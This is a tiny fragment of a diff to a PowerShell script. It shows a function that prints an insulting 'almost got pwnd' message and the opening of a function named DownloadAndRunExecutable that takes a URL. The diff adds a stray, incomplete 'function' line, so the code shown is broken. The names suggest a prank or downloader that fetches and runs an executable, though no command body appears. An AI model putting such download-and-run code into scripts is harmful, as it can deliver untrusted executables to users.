@@ -2,7 +2,7 @@ function SayHiToTheIdiot{
     Write-Host "You absolute dick you almost got pwnd"
 }
 
-
+function 
 function DownloadAndRunExecutable {
     param(
         [string]$url,
